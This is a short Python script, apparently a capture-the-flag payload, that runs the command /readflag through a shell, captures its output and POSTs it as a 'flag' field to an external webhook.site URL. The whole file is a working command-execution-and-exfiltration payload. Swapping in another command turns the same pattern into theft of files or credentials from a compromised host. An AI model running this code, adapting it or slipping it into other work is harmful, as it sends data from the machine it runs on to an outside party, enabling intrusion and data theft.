import subprocess
import urllib.request
import urllib.parse

# Define the command and webhook URL
command = "/readflag"
webhook_url = "https://webhook.site/f661d597-29b1-446f-bc90-260f6b826bc7"  # Change this URL to your actual webhook

# Run the command and capture its output
process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
stdout, stderr = process.communicate()

# Ensure output is decoded from bytes to string if necessary
result = stdout.decode() if isinstance(stdout, bytes) else stdout

# Prepare data for POST request
data = urllib.parse.urlencode({'flag': result}).encode()

# Create a request object
req = urllib.request.Request(webhook_url, data=data)

# Send the request and capture the response
response = urllib.request.urlopen(req)

# Optionally print the status code to help with debugging
print("Status Code:", response.getcode())
